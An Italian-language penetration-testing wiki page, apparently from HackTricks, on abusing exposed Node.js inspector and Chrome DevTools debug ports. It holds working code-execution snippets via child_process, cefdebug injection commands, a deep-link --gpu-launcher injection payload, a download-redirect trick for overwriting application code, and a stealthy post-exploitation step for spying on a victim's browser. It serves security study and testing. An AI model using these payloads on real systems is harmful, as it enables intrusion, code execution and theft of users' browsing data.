# Abuso del debug di Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

[From the docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando avviato con l'opzione `--inspect`, un processo Node.js ascolta per un client di debug. Per **default**, ascolterà all'indirizzo host e alla porta **`127.0.0.1:9229`**. Ogni processo è anche assegnato a un **UUID** **unico**.

I client dell'inspector devono conoscere e specificare l'indirizzo host, la porta e l'UUID per connettersi. Un URL completo apparirà simile a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

> [!WARNING]
> Poiché il **debugger ha accesso completo all'ambiente di esecuzione di Node.js**, un attore malintenzionato in grado di connettersi a questa porta potrebbe essere in grado di eseguire codice arbitrario per conto del processo Node.js (**potenziale escalation dei privilegi**).

Ci sono diversi modi per avviare un inspector:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Quando avvii un processo ispezionato, apparirà qualcosa del genere:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
I processi basati su **CEF** (**Chromium Embedded Framework**) devono utilizzare il parametro: `--remote-debugging-port=9222` per aprire il **debugger** (le protezioni SSRF rimangono molto simili). Tuttavia, **invece** di concedere una sessione di **debug** **NodeJS**, comunicheranno con il browser utilizzando il [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), che è un'interfaccia per controllare il browser, ma non c'è un RCE diretto.

Quando avvii un browser in debug, apparirà qualcosa del genere:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets e politica di stessa origine <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

I siti web aperti in un browser possono effettuare richieste WebSocket e HTTP secondo il modello di sicurezza del browser. Una **connessione HTTP iniziale** è necessaria per **ottenere un id di sessione debugger unico**. La **politica di stessa origine** **impedisce** ai siti web di poter effettuare **questa connessione HTTP**. Per ulteriore sicurezza contro [**gli attacchi di DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica che gli **header 'Host'** per la connessione specifichino un **indirizzo IP** o **`localhost`** o **`localhost6`** precisamente.

> [!NOTE]
> Queste **misure di sicurezza impediscono di sfruttare l'inspector** per eseguire codice **semplicemente inviando una richiesta HTTP** (cosa che potrebbe essere fatta sfruttando una vulnerabilità SSRF).

### Avviare l'inspector nei processi in esecuzione

Puoi inviare il **segnale SIGUSR1** a un processo nodejs in esecuzione per farlo **avviare l'inspector** nella porta predefinita. Tuttavia, nota che devi avere privilegi sufficienti, quindi questo potrebbe concederti **accesso privilegiato alle informazioni all'interno del processo** ma non una diretta escalation di privilegi.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!NOTE]
> Questo è utile nei contenitori perché **arrestare il processo e avviarne uno nuovo** con `--inspect` **non è un'opzione** perché il **contenitore** verrà **terminato** con il processo.

### Connettersi all'inspector/debugger

Per connettersi a un **browser basato su Chromium**, è possibile accedere agli URL `chrome://inspect` o `edge://inspect` per Chrome o Edge, rispettivamente. Cliccando sul pulsante Configura, si dovrebbe garantire che l'**host e la porta di destinazione** siano elencati correttamente. L'immagine mostra un esempio di Esecuzione Remota di Codice (RCE):

![](<../../images/image (674).png>)

Utilizzando la **linea di comando** è possibile connettersi a un debugger/inspector con:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Lo strumento [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) consente di **trovare gli ispettori** in esecuzione localmente e **iniettare codice** in essi.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!NOTE]
> Nota che gli **exploit RCE di NodeJS non funzioneranno** se connessi a un browser tramite [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (devi controllare l'API per trovare cose interessanti da fare con esso).

## RCE nel Debugger/Inspector di NodeJS

> [!NOTE]
> Se sei arrivato qui cercando come ottenere [**RCE da un XSS in Electron, controlla questa pagina.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)

Alcuni modi comuni per ottenere **RCE** quando puoi **connetterti** a un **inspector** di Node è utilizzare qualcosa come (sembra che questo **non funzionerà in una connessione al protocollo Chrome DevTools**):
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Puoi controllare l'API qui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In questa sezione elencherò solo cose interessanti che ho trovato che le persone hanno usato per sfruttare questo protocollo.

### Parameter Injection via Deep Links

Nel [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security ha scoperto che un'applicazione basata su CEF **ha registrato un URI personalizzato** nel sistema (workspaces://) che riceveva l'URI completo e poi **lanciava l'applicazione basata su CEF** con una configurazione che era parzialmente costruita da quell'URI.

È stato scoperto che i parametri URI venivano decodificati in URL e utilizzati per lanciare l'applicazione di base CEF, consentendo a un utente di **iniettare** il flag **`--gpu-launcher`** nella **linea di comando** ed eseguire cose arbitrarie.

Quindi, un payload come:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Eseguirà un calc.exe.

### Sovrascrivere File

Cambia la cartella in cui **i file scaricati verranno salvati** e scarica un file per **sovrascrivere** il **codice sorgente** dell'applicazione utilizzato frequentemente con il tuo **codice malevolo**.
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE e esfiltrazione

Secondo questo post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) è possibile ottenere RCE ed esfiltrare pagine interne da theriver.

### Post-Exploitation

In un ambiente reale e **dopo aver compromesso** un PC utente che utilizza un browser basato su Chrome/Chromium, potresti avviare un processo Chrome con il **debugging attivato e inoltrare la porta di debugging** in modo da poter accedervi. In questo modo sarai in grado di **ispezionare tutto ciò che la vittima fa con Chrome e rubare informazioni sensibili**.

Il modo furtivo è **terminare ogni processo Chrome** e poi chiamare qualcosa come
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Riferimenti

- [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
- [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
- [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

{{#include ../../banners/hacktricks-training.md}}
